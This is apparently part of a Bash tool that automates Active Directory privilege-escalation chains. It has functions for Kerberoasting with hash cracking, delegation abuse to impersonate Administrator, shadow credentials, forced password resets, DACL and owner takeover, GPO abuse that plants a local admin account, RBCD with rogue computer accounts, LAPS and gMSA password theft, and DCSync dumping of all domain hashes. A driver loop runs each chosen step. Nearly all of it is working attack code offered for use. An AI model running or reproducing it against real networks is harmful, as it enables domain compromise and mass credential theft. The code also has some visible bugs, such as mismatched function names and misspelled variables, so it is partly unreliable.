    echo "$TARGET" > ./users_file.txt
    local OUTPUT=$($targetedkerberoast -d "$DOMAIN" -U ./users_file.txt -u "$SRC" -k --no-pass --dc-host "$DC_FQDN" -f hashcat 2>&1)
    
    # Extract the hash
    local KERB_HASH=$(echo "$OUTPUT" | grep -oP '\$krb5tgs\$[^\s]*')
    if [ -z "$KERB_HASH" ]; then
        echo "[-] Failed to get Kerberoast hash with output \n $OUTPUT" >/dev/tty
        return 1
    fi
    
    echo "[+] Obtained Kerberos hash:" >/dev/tty
    echo "$KERB_HASH" >/dev/tty
    echo "$KERB_HASH" > "$TARGET".hash

    hashcat_crack "$TARGET.hash" 13100
    get_ticket "$DC_FQDN" -u "$TARGET" -p "$CRACKED_PASS"
}

AllowedToDelegate(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AllowedToDelegate--> $3\" \n${NC}" >/dev/tty
    
    export KRB5CCNAME="./$SRC.ccache"
    if ! getST.py -k -no-pass -spn "cifs/${TARGET%$}.$DOMAIN" -impersonate Administrator -dc-ip "$DC_FQDN" "$DOMAIN/$SRC"; then
        echo "[-] getST failed" > /dev/tty
        return 1
    fi
    mv ./*cifs*"$TARGET"*"$DOMAIN".ccache ./"$TARGET".ccache
}

AddKeyCredentialwLink(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AddKeyCredentialLink--> $3\" \n${NC}" >/dev/tty
    
    export KRB5CCNAME="./$SRC.ccache"

    local output
    output=$(certipy-ad shadow auto -k -no-pass -dc-host "$DC_FQDN" -account "$TARGET" -dc-ip "$DC_IP" -ldap-scheme ldap -ns $DC_IP -dns-tcp -target "$DC_FQDN" 2>&1 | tee /dev/tty)

    # Failed to get both ticket and hash
    if [[ "$output" == *"[-] Got error while trying to request TGT"* ]] && [[ "$output" == *"NT hash for"*"None"* ]]; then
        return 1
    fi

    # Ticket created
    if [[ "$output" == *"Got TGT"* ]]; then
        mv "${TARGET,,}.ccache" "$TARGET.ccache"
        # Hash retrieved
        if [[ "$output" =~ "NT hash for '".*"': "([a-f0-9]{32}) ]]; then
            hash="${BASH_REMATCH[1]}"
            echo -e "${BLUE}[+] Extracted NT hash: $hash${NC}" >/dev/tty
        fi
        echo -e "${BLUE}[+] Ticket ${TARGET}.ccache created and saved in current dir. ${NC}" >/dev/tty
        return 0
    fi
    
    # Hash retrieved but no ticket
    if [[ "$output" =~ "NT hash for '".*"': "([a-f0-9]{32}) ]]; then
        hash="${BASH_REMATCH[1]}"
        echo -e "${BLUE}[+] Extracted NT hash: $hash${NC}" >/dev/tty
        get_ticket "$DC_FQDN" -u "$TARGET" -H "$hash"
        return $?
    fi

    return 1
}

AddSelf() {
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AddSelf--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"
    
    if ! bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k add groupMember "$TARGET" "$SRC"; then
        return 1
    else
        return 0
    fi
}

ForceChangePassword() {
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---ForceChangePassword--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"
    
    echo -e "${BLUE}\n[+] Setting as new password for \"$TARGET\": P@ssword123!P@ssword123! \n${NC}"

    if ! bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k set password "$TARGET" 'P@ssword123!P@ssword123!'; then
        echo "[-] ERROR: Failed to change password for $TARGET" >&2
        return 1
    fi
    
    if ! get_ticket "$DC_FQDN" -u "$TARGET" -p 'P@ssword123!P@ssword123!'; then
        return 1
    fi

    return 0
}

WriteOwner() {
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteOwner--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"

    if ! bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k set owner "$TARGET" "$SRC"; then
        echo "[-] Failed to give WriteDACL for $TARGET"
        return 1
    fi
    if ! WriteDACL "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"; then
        echo "[-] Failed to WriteOwner for $TARGET"
        return 1
    fi
    return 0
}

WriteDACL(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteDACL--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"

    if [[ "$TARGET_TYPE" == "Domain" ]]; then
        bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k add dcsync "$SRC"
        DCSync "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
    else
        bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k add genericAll "$TARGET" "$SRC"
        GenericAll "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
    fi
    return 0
}
Owns(){
    echo "Skipping Owns Node" >/dev/tty
    return 0
}

WriteGPLink(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteGPLink--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"

    echo -e "\nPlease execute this command on Windows (powershell):\n\n\"New-GPO -Name MyGPO -Comment \"MyGPO\" | New-GPLink -Target \"OU=$TARGET,DC=$(echo $domain | sed 's/\./,DC=/g')\" -LinkEnabled Yes\"" >/dev/tty
    while true; do
        read -rp "Input the GPO ID (or 'exit' to quit): " GPO_ID </dev/tty
        if [[ "$GPO_ID" == "exit" ]]; then
            return 1
        fi
        if [[ -z "$GPO_ID" ]]; then
            echo "[-] Invalid GPO ID, try again: " >/dev/tty
            continue
        fi
        break
    done

    # ONLY VALID FOR COMPUTER CHILDS
    if ! $pygpoabuse ${DOMAIN,,}/${SRC,,} -k -ccache "./$SRC.ccache" -dc-ip "$(echo $DC_FQDN | awk -F'.' '{print $1}')" -gpo-id "$GPO_ID" -f -vv | grep -i 'created!' >/dev/tty; then
        echo -e "\nTASK CREATION FAILED! MAKE SURE GPO-ID AND CREDENTIALS ARE CORRECT\n"
        return 1
    else
        echo -e "\nTASK CREATED! EXECUTE \"gpupdate /force\" ON THE WINDOWS HOST TO CREATE LOCAL ADMIN\n"
        echo -e "LOCAL ADMIN CREDENTIALS -> \"john:H4x00r123..\"\n"
        return 0
    fi
}

GenericAll() {
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---GenericAll--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"

    if [[ "$TARGET_TYPE" == "User" ]]; then
        AddKeyCredentialLink "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
        result1=$?
        WriteSPN "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
        result2=$?
        if [[ $result1 -ne 0 ]] && [[ $result2 -ne 0 ]]; then
            ForceChangePassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
            result3=$?
            if [[ $result3 -ne 0 ]]; then
                return 1
            fi
        fi
        return 0
    fi

    if [[ "$TARGET_TYPE" == "Group" ]]; then
        if ! AddMember "$DC_FQDN" "$cur_user" "$TARGET" "$TARGET_TYPE"; then
            return 1
        fi
    fi

    if [[ "$TARGET_TYPE" == "Domain" ]]; then
        if ! DCSync "$DC_FQDN" "$cur_user" "$TARGET" "$TARGET_TYPE"; then
            return 1
        fi
    fi

    if [[ "$TARGET_TYPE" == "GPO" ]]; then
#----------------------------------------LDAP AUTH----------------------------------------------
        echo -e "\n[*] LDAP Authentication" >/dev/tty
        # Try to authenticate with prev. ticket
        nxc_output=$(nxc ldap "$DC_FQDN" --use-kcache --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
        if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
            echo "Authentication successful!" >/dev/tty
        else
            # Manual ldap auth
            PS3="Select authentication method: "
            options=("Password" "NTLM Hash" "Kerberos Ticket" "Quit")
            auth_success=false

            while true; do
                select opt in "${options[@]}"; do
                    case $opt in
                        "Password")
                            read -p "[?] Enter username: " username </dev/tty
                            read -s -p "[?] Enter password: " password </dev/tty
                            echo
                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -p "$password" --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo "[+]Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo "[-]Authentication failed. Error output:" >/dev/tty
                                echo "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "NTLM Hash")
                            read -p "[?] Enter username: " username </dev/tty
                            read -s -p "[?] Enter NTLM hash: " hash </dev/tty
                            echo
                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -H "$hash" --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo "Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo "Authentication failed. Error output:" >/dev/tty
                                echo "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "Kerberos Ticket")
                            read -e -p "[?] Enter Kerberos .ccache Path: " ticket </dev/tty
                            export KRB5CCNAME="$ticket"
                            GPO_ID=$(nxc ldap "$DC_FQDN" -u "$username" -H "$hash" --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
                            echo 
                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo "Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo "Authentication failed. Error output:" >/dev/tty
                                echo "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "Quit")
                            return 1
                            ;;
                        *) 
                            echo "Invalid option $REPLY. Please select a valid option (1-4)." >/dev/tty
                            continue
                            ;;
                    esac
                done
            done

            if ! "$auth_success"; then
                echo "Failed to authenticate after multiple attempts" >/dev/tty
                return 1
            fi
        fi
# ------------------------------------------pygpoabuse-------------------------------------------------
        GPO_ID=$(echo "$nxc_ouput" | grep -i "Default Domain Policy" -A1 | awk '{print $6}' | tail -n 1)
        if ! $pygpoabuse ${DOMAIN,,}/${SRC,,} -k -ccache "./$SRC.ccache" -dc-ip "$(echo $DC_FQDN | awk -F"." '{print $1}')" -gpo-id "$GPO_ID" -f 2>&1 | grep -i 'created!' >/dev/tty; then
            echo -e "\nTASK CREATION FAILED! MAKE SURE GPO-ID AND CREDENTIALS ARE CORRECT\n"
            return 1
        else
            echo -e "\nTASK CREATED! EXECUTE \"gpupdate /force\" ON THE WINDOWS HOST TO CREATE LOCAL ADMIN\n"
            echo -e "LOCAL ADMIN CREDENTIALS -> \"john:H4x00r123..\"\n"
            return 0
        fi   
    fi     

    if [[ "$TARGET_TYPE" == "Computers" ]]; then
        echo -e "\n[*] Trying to read LAPS password..." >/dev/tty
        if ReadLAPSPassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"; then
            return 0
        fi
        echo "[-] Read LAPS Failed, trying GenricAll exploit"
#----------------------------------------LDAP AUTH----------------------------------------------
        echo -e "\n[*] LDAP Authentication" >/dev/tty
        # Try to authenticate with prev. ticket
        nxc_output=$(nxc ldap "$DC_FQDN" --use-kcache -M maq 2>&1)
        if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
            echo "Authentication successful!" >/dev/tty
        else
            # Manual ldap auth
            PS3="Select authentication method: "
            options=("Password" "NTLM Hash" "Kerberos Ticket" "Quit")
            auth_success=false

            while true; do
                select opt in "${options[@]}"; do
                    case $opt in
                        "Password")
                            read -p "[?] Enter username: " username </dev/tty
                            read -s -p "[?] Enter password: " password </dev/tty
                            echo
                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -p "$password" -M maq 2>&1)
                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo "[+]Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo "[-]Authentication failed. Error output:" >/dev/tty
                                echo "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "NTLM Hash")
                            read -p "[?] Enter username: " username </dev/tty
                            read -s -p "[?] Enter NTLM hash: " hash </dev/tty
                            echo
                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -H "$hash" -M maq 2>&1)
                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo "Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo "Authentication failed. Error output:" >/dev/tty
                                echo "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "Kerberos Ticket")
                            read -e -p "[?] Enter Kerberos .ccache Path: " ticket </dev/tty
                            export KRB5CCNAME="$ticket"
                            nxc_output=$(nxc ldap "$DC_FQDN" --use-kcache -M maq 2>&1)
                            echo 
                            if echo "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo "Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo "Authentication failed. Error output:" >/dev/tty
                                echo "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "Quit")
                            return 1
                            ;;
                        *) 
                            echo "Invalid option $REPLY. Please select a valid option (1-4)." >/dev/tty
                            continue
                            ;;
                    esac
                done
            done

            if ! $auth_success; then
                echo "Failed to authenticate after multiple attempts" >/dev/tty
                return 1
            fi
        fi
# -------------------------------EXTRACT MAQ------------------------------
        local maq=$(echo "$nxc_output" | grep "MachineAccountQuota:" | awk '{print $6}')
        # Check if MAQ was found
        if [[ -n "$maq" && "$maq" =~ ^[0-9]+$ ]]; then
            echo "[+] MachineAccountQuota: $maq" >/dev/tty
#---------------------------------MAQ=0-----------------------------------------------
            if [[ "$maq" -eq 0 ]]; then
                computer_pass=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 32 | head -n 1)
                echo -e "\n[*] MAQ is 0 -> Trying Password Reset with Password $computer_pass" >/dev/tty
                if ! addcomputer.py -no-pass -k -computer-name '$TARGET$' -computer-pass '$computer_pass' -no-add; then
                    echo "[-] Password Reset failed" >/dev/tty
                    return 1
                fi
                getticket "$DC_FQDN" -u "TARGET" -p "$computer_pass"
            else
#--------------------------------MAQ>0------------------------------------------------
                echo -e "\n[*] MAQ is not 0 -> Adding a Computer Account" >/dev/tty
                computer_name="DESKTOP-$(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 8 | head -n 1)\$"
                computer_pass=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 32 | head -n 1)
                echo -e "\n[*] Creating a PC account $computer_name with password $computer_pass." >/dev/tty
                if ! addcomputer.py $DOMAIN/ -no-pass -k -computer-name "$computer_name" -computer-pass "$computer_pass" -dc-host $DC_FQDN; then
                    echo "[-] Creation failed" >/dev/tty
                    return 1
                fi 
                echo -e "\n[*] Becoming Admin of $TARGET" >/dev/tty
                if ! rbcd.py $DOMAIN/$SRC -no-pass -k -delegate-from "$computer_name" -delegate-to "$TARGET" -action write; then
                    echo "[-] rbcd Failed">/dev/tty
                    return 1
                fi 
                get_ticket $DC_FQDN -u $computer_name -p $computer_pass
                echo -e "\n[*] getST: Impersonating Administrator" >/dev/tty
                echo 
                if ! getST.py -k -no-pass -spn "cifs/${TARGET%$}.$DOMAIN" -impersonate Administrator -dc-ip "$DC_FQDN" "$DOMAIN/$computer_name"; then
                    echo "[-] getST failed">/dev/tty
                    return 1
                fi
            fi
        else
            echo "[-] ERROR: Could not determine MachineAccountQuota" >/dev/tty
            return 1
        fi
    fi

    if [[ "$TARGET_TYPE" == "OU" ]]; then
        echo "Giving GenericAll on Non-Admin Child Objects" >/dev/tty
        if dacledit.py "$DOMAIN/$SRC" -no-pass -k -action 'write' -rights 'FullControl' -inheritance -principal "$SRC" -target-dn "$TARGET"; then
            return 0
        fi
        if ! WriteGPLink "$1" "$2" "$3" "$4"; then
            return 1
        fi
    fi
    return 0
}  


DCSync(){                    
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"
    
    dom_base=$(echo $DOMAIN | awk -F"." '{print $1}')

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---DCSync--> $3\" \n${NC}" >/dev/tty

    while true; do
        echo "Do you want to dump:" >/dev/tty
        echo "1. Administrator account only" >/dev/tty
        echo "2. Specific user(s)" >/dev/tty
        echo "3. All users" >/dev/tty
        read -p "Enter your choice (1-3): " choice </dev/tty
            
        case $choice in
            1)
                if ! secretsdump.py "$DOMAIN/@$DC_FQDN" -k -no-pass -just-dc-user "$dom_base\Administrator"; then
                    return 1
                fi
                break
                ;;
            2)
                read -p "Enter username(s) to dump (comma-separated for multiple): " users </dev/tty
                IFS=',' read -ra user_array <<< "$users"
                for user in "${user_array[@]}"; do
                    if ! secretsdump.py "$DOMAIN/@$DC_FQDN" -k -no-pass -just-dc-user "$dom_base\$user"; then
                        return 1
                    fi
                done
                break
                ;;
            3)
                if ! secretsdump.py "$DOMAIN/@$DC_FQDN" -k -no-pass; then
                    return 1
                fi
                break
                ;;
            *)
                echo -e "[-] Invalid choice, please try again.\n" >/dev/tty
                ;;
        esac
    done
    return 0
}

AllExtendedRights(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AllExtendedRights--> $3\" \n${NC}" >/dev/tty

    if [ "$TARGET_TYPE" == 'Users' ]; then
        ForceChangePassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"

    elif [ "$TARGET_TYPE" == 'Computers' ]; then
        ReadLAPSPassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"

    elif [ "$TARGET_TYPE" == 'Domain' ]; then
        DCSync "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
    
    else
        echo "[-] ERROR: Invalid target type '$TARGET_TYPE'" >/dev/tty
        echo "[-] Valid target types are: Users, Computers, Domain" >/dev/tty
        return 1
    fi
}

AddMember(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AddMember--> $3\" \n${NC}" >/dev/tty

    # Get user input with validation
    while true; do
        read -r -p "Input member to add/remove: " member </dev/tty
        if [[ -n "$member" ]]; then
            break
        fi
        echo -e "[-] ERROR: Member cannot be empty" >/dev/tty
    done

    while true; do
        read -r -p "Input action (add/remove): " action </dev/tty
        action=$(echo "$action" | tr '[:upper:]' '[:lower:]')
        if [[ "$action" == "add" || "$action" == "remove" ]]; then
            break
        fi
        echo -e "[-] ERROR: Action must be either 'add' or 'remove'" >/dev/tty
    done

    # Execute the operation
    if bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k "$action" groupMember "$TARGET" "$member"; then
        echo -e "[+] Successfully performed $action operation on $member$" >/dev/tty
        return 0
    else
        return 1
    fi
}

GenericWrite(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"
    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---GenericWrite--> $3\" \n${NC}"

    if [[ "$TARGET_TYPE" == "User" ]]; then
        certipy-ad shadow auto -k -no-pass -dc-host "$DC_FQDN" -account "$TARGET" -dc-ip "$DC_IP"
        certipy_rc=$?
        
        if [[ $certipy_rc -eq 0 && -s ${TARGET,,}.ccache ]]; then
            mv ${TARGET,,}.ccache "./${TARGET}.ccache"
            export KRB5CCNAME="./${TARGET}.ccache"
            klist
            exit 0  # Explicitly return success from certipy
        else
            # If certipy failed, try WriteSPN
            if WriteSPN "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"; then
                exit $?  # Return WriteSPN's return code (should be 0 if successful)
            else
                # If WriteSPN failed, try ForceChangePassword and return its code
                ForceChangePassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
                exit $?  # Return ForceChangePassword's return code
            fi
        fi
    elif [[ "$TARGET_TYPE" == "Group" ]]; then
        AddMember "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
    elif [[ "$TARGET_TYPE" == "OU" ]]; then
        WriteGPLink "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
    fi
}


ReadLAPSPassword() {
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---ReadLAPSPassword--> $3\" \n${NC}" >/dev/tty

    # LAPS password retrieval
    laps=$(bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k get search --filter '(ms-mcs-admpwd=*)' --attr ms-mcs-admpwd 2>&1)
    if [[ ! -z "$laps" ]]; then
        echo -e "[+] Found LAPS Password: $laps" >/dev/tty
        echo -e "Attempting Local Admin Authentication on \"$TARGET\"" >/dev/tty
        nxc smb -u Administrator -p "$laps" --local-auth -x "whoami" >/dev/tty
        nxc smb -u Administrator -p "$laps" -x "whoami" >/dev/tty
        return 0
    else
        echo "[-] No LAPS password found" >/dev/tty
        return 1
    fi
}


ReadGMSAPassword(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---ReadGMSAPassword--> $3\" \n${NC}" >/dev/tty
    
    output=$(bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k get object "$TARGET" --attr msDS-ManagedPassword)
    target_hash=$(echo "$output" | grep -i msDS-ManagedPassword.NTLM | awk -F":" '{print $3}')
    echo -e "Found \"$TARGET\" Hash: $target_hash" >/dev/tty
    if get_ticket "$DC_FQDN" -u "$TARGET" -H "$target_hash"; then
        return 0
    else
        return 1
    fi
}

# Proceed with exploitation
echo -e "\nProceeding with exploitation..."
for chain in "${selected_chains[@]}"; do
    # Initialize
    prev_src=""
    prev_abuse=""
    prev_source_type=""

    echo "$chain" | \
    awk -F ' ---|--> ' '{
        for (i=2; i<=NF; i+=2) {
            abuse = $i;
            source = $(i-1);
            target = $(i+1);
            printf "%s \"%s\" \"%s\"\n", abuse, source, target;
        }
    }' | \
    
    while read -r cmd; do
        source=$(echo "$cmd" | awk -F'"' '{print $2}')
        source_type=$(color_to_obj "$source")
        type=$(color_to_obj "$(echo "$cmd" | awk -F'"' '{print $4}')")  # Changed from $3 to $4
        abuse=$(echo "$cmd" | awk '{print $1}' | sed 's/\x1B\[[0-9;]*[mGK]//g')

        if [[ "$prev_abuse" == "MemberOf" && "$prev_source_type" == "User" ]]; then
            SRC="$prev_src"
        elif [[ "$source_type" == "Group" && "$prev_abuse" != "MemberOf" ]]; then
            while true; do
                # Ask for username - use $source (the group name) in prompt
                read -erp $'[?] Enter username for a member of '"${source}"$'\e[0m: ' username </dev/tty
                # Convert to uppercase but preserve existing $ if present
                if [[ "$username" == *\$ ]]; then
                    SRC=$(echo "${username%\$}" | tr '[:lower:]' '[:upper:]')"\$"
                else
                    SRC=$(echo "$username" | tr '[:lower:]' '[:upper:]')
                fi
                
                # Authentication menu
                echo "[?] Choose authentication method for $SRC:"
                echo "  1) Password"
                echo "  2) NT hash"
                echo "  3) Kerberos ticket file"
                read -erp "Select option (1-3): " auth_method </dev/tty
                
                case $auth_method in
                    1)
                        read -erp "[?] Enter password for $SRC: " password </dev/tty
                        echo
                        get_ticket "$DC_FQDN" -u "$SRC" -p "$password"
                        [ $? -eq 0 ] && break
                        ;;
                    2)
                        while true; do
                            read -erp "[?] Enter NT hash for $SRC (32 chars): " nt_hash </dev/tty
                            if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
                                get_ticket "$DC_FQDN" -u "$SRC" -H "$nt_hash"
                                [ $? -eq 0 ] && break 2
                                break
                            else
                                echo "[-] Invalid hash format. Must be 32-character hex string."
                            fi
                        done
                        ;;
                    3)
                        while true; do
                            read -erp "[?] Enter path to Kerberos ticket file: " ticket_file </dev/tty
                            if [[ -f "$ticket_file" && -s "$ticket_file" ]]; then
                                cp "$ticket_file" "./${USER}.ccache"
                                export KRB5CCNAME="$ticket_file"
                                klist && break 2 || echo "[-] Invalid/expired ticket file"; break
                            else
                                echo "[-] Invalid ticket file"
                                break
                            fi
                        done
                        ;;
                    *)
                        echo "[-] Invalid selection. Please choose 1, 2, or 3."
                        ;;
                esac
                echo -e "[-] Authentication failed. Please try again.\n"
            done
        else
            SRC="$source"
        fi

        # Store current values for next iteration
        prev_abuse="$abuse"
        prev_src="$SRC"
        prev_source_type="$source_type"

        # Execute the command
        echo "$abuse $DC_FQDN \"$(echo "$SRC" | sed 's/\x1B\[[0-9;]*[mGK]//g')\" \"$(echo "$cmd" | awk -F"\"" '{print $4}' | sed 's/\x1B\[[0-9;]*[mGK]//g')\" $type" | sed 's/\x1B\[[0-9;]*[mGK]//g' | \
        while read -r exec_cmd; do
            # Rest of your execution logic
            # Execute the command and capture the exit status
            eval "$exec_cmd"
            exit_status=$?

            # Check if the command failed (non-zero exit status)
            if [ $exit_status -ne 0 ]; then
                echo -e "\n${RED}[!] $abuse failed${NC}" >/dev/tty

                # Prompt user for action
                while true; do
                    read -p "[?] Do you want to (S)kip or (R)etry? [S/R]: " choice </dev/tty
                    case "$choice" in
                        [Ss]* ) 
                            echo -e "[~] Skipping to next command..." >/dev/tty
                            break  # Exit the retry loop, proceed to next command
                            ;;
                        [Rr]* ) 
                            echo -e "[~] Retrying..." >/dev/tty
                            if eval "$exec_cmd"; then  # This automatically checks for exit status 0
                                break  # Success, proceed to next command
                            fi
                            ;;
                        * ) 
                            echo -e "[!] Invalid choice. Please enter S (Skip) or R (Retry)." >/dev/tty
                            ;;
                    esac
                done
            fi
        done
    done
done
